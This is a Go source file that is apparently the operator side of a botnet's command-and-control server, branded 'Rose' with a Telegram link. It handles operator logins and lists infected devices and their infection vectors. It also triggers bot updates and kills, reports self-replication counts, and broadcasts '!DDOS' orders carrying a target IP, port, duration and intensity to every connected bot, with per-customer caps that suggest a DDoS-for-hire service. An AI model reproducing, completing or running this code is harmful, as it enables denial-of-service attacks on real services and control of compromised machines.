package socket

import (
	//"cnc/lib/grafana"
	"cnc/lib/security"
	"cnc/lib/utils"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
)

func (m *Master) HandleConnection() {
	utils.Debug(fmt.Sprintf("[*] New Master connected --> %s", m.Network.Socket.RemoteAddr()))
	MasterList = append(MasterList, m)

	defer func() {
		_ = m.Network.Socket.Close()
		m = nil
	}()

	m.Network.Input()
	m.ClearConsole()
	for m.Network.Connected && !m.Logged && m.LogAttemp < 3 {
		m.Network.Send("username: ")
		success, username := m.Network.Input()

		if !success {
			continue
		}

		m.Network.Send("password: ")
		success, password := m.Network.Input()

		if !success {
			continue
		}

		for _, user := range utils.Users {
			if user.Username == username && user.Password == password {
				m.Logged = true
				m.LoggedUser = user
			}
		}

		m.Network.Send(utils.FormatSocketString("Invalid credential."))
		m.LogAttemp++
	}

	if !m.Logged {
		m.Network.Send(utils.FormatSocketString("Too many attemps. Disconnecting."))
		m.Network.Connected = false
		time.Sleep(3 * time.Second)
		return
	}

	go m.TaskUpdateTitle()
	m.ClearConsole()

	for m.Network.Connected {
		m.Network.Send(fmt.Sprintf("%s@botnet: ", m.LoggedUser.Username))
		success, data := m.Network.Input()

		if !success {
			continue
		}

		switch data {
		case "clear":
			m.ClearConsole()
		case "exit":
			m.Network.Connected = false
		case "cls":
			m.ClearConsole()
		case "method":
			var met string

			for _, method := range utils.Methods {
				met = fmt.Sprintf("%s, %s", met, method)
			}

			for _, prompt := range []string{
				" ",
				fmt.Sprintf("  » %s", met[2:]),
				" ",
				"  » !method ip port time [thread] [power] [length]",
				"  » !stop",
				" ",
			} {
				m.Network.Send(utils.FormatSocketString(prompt))
			}
		case "help":
			for _, prompt := range []string{
				" ",
				"  » clear",
				"  » method",
				"  » update",
				"  » device",
				"  » selfrep",
				" ",
			} {
				m.Network.Send(utils.FormatSocketString(prompt))
			}
		case "!stop":
			if !m.LoggedUser.Admin {
				m.Network.Send(utils.FormatSocketString("  » Admin command"))
				return
			}

			ttl := m.SendToAllBot("!STOP")
			m.Network.Send(utils.FormatSocketString(fmt.Sprintf("  » The command has been distributed to %d bots", ttl)))
		case "update":
			if !m.LoggedUser.Admin {
				m.Network.Send(utils.FormatSocketString("  » Admin command"))
				return
			}

			ttl := m.SendToAllBot("!UPDATE")
			m.Network.Send(utils.FormatSocketString(fmt.Sprintf("  » The command has been distributed to %d bots", ttl)))
		case "device":
			if !m.LoggedUser.Admin {
				m.Network.Send(utils.FormatSocketString("  » Admin command"))
				return
			}

			for i, bot := range BotList {
				if !bot.Auth {
					continue
				}

				m.Network.Send(utils.FormatSocketString(fmt.Sprintf("  » [#%d] [arch: %s] [cpu: %d] [version: %s] [vector: %s]", i, bot.Arch, bot.Cpu, bot.Version, bot.Vector)))
			}
		case "killds":
			if !m.LoggedUser.Admin {
				m.Network.Send(utils.FormatSocketString("  » Admin command"))
				return
			}

			ttl := m.SendToAllBot("!KILLDS") // kill this shit !!
			m.Network.Send(utils.FormatSocketString(fmt.Sprintf("  » Killed %d bots...", ttl)))
		case "selfrep":
			if !m.LoggedUser.Admin {
				m.Network.Send(utils.FormatSocketString("  » Admin command"))
				return
			}

			Exploits := map[string]int{}

			for _, bot := range BotList {
				if !bot.Auth {
					continue
				}

				if _, ok := Exploits[bot.Vector]; !ok {
					Exploits[bot.Vector] = 1
				} else {
					Exploits[bot.Vector]++
				}
			}

			for vector, count := range Exploits {
				m.Network.Send(utils.FormatSocketString(fmt.Sprintf("  » %s: %d", vector, count)))
			}
		}

		if !strings.HasPrefix(data, "!") {
			continue
		}

		args := strings.Split(strings.Split(data, "!")[1], " ")

		if len(args) < 4 {
			continue
		}

		if !utils.StringInList(utils.Methods, args[0]) {
			m.Network.Send(utils.FormatSocketString("  » Invalid method."))
			continue
		}

		// !method ip port time [thread] [power] [length]
		thread, power, length := "250", "32", "50"

		if len(args) >= 5 {
			thread = args[4]
		}

		if len(args) >= 6 {
			power = args[5]
		}

		if len(args) >= 7 {
			length = args[6]
		}

		// convert everything to int
		i_threads, err := strconv.Atoi(thread)
		if utils.HandleError(err) {
			return
		}

		i_power, err := strconv.Atoi(power)
		if utils.HandleError(err) {
			return
		}

		i_length, err := strconv.Atoi(length)
		if utils.HandleError(err) {
			return
		}

		i_time, err := strconv.Atoi(args[3])
		if utils.HandleError(err) {
			return
		}

		if !m.LoggedUser.Admin {
			if i_threads >= m.LoggedUser.Thread {
				i_threads = m.LoggedUser.Thread
			}

			if i_power >= m.LoggedUser.Power {
				i_power = m.LoggedUser.Power
			}

			if i_length >= m.LoggedUser.Length {
				i_length = m.LoggedUser.Length
			}

			if i_time >= m.LoggedUser.Time {
				i_time = m.LoggedUser.Time
			}
		}

		ttl := m.SendToAllBot(fmt.Sprintf("!DDOS %s %s %s %d %d %d %d", strings.ToUpper(args[0]), args[1], args[2], i_time, i_threads, i_power, i_length))
		//grafana.MethodCount.WithLabelValues(strings.ToUpper(args[0])).Add(1)
		m.Network.Send(utils.FormatSocketString(fmt.Sprintf("  » The command has been distributed to %d bots", ttl)))
	}
}

func (m *Master) TaskUpdateTitle() {
	for m.Network.Connected {
		var count int
		for _, b := range BotList {
			if b.Auth {
				count++
			}
		}

		m.Network.Send(fmt.Sprintf("\033]0; %s\007", fmt.Sprintf("%d Rose™ » t.me/rosebotnet", count)))
		time.Sleep(1 * time.Second)
	}
}

func (m *Master) SendToAllBot(Payload string) int {
	success := 0

	for _, bot := range BotList {
		if !bot.Auth {
			continue
		}

		if bot.Network.Send(security.EncryptStr(Payload)) {
			success++
		}
	}

	return success
}

func (m *Master) ClearConsole() {
	m.Network.Send("\033[2J\033[1H")
}

func StartMasterServer() {
	socket, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", utils.MasterSocketPort))
	utils.HandleError(err)

	utils.Log(fmt.Sprintf("[*] [MASTER] Server open on port %d", utils.MasterSocketPort))

	for {
		conn, err := socket.Accept()
		utils.HandleError(err)

		m := Master{
			Network: &Socket{
				Connected: true,
				Socket:    conn,
			},
			Logged:    false,
			LogAttemp: 0,
		}

		m.ClearConsole()
		go m.HandleConnection()
	}
}
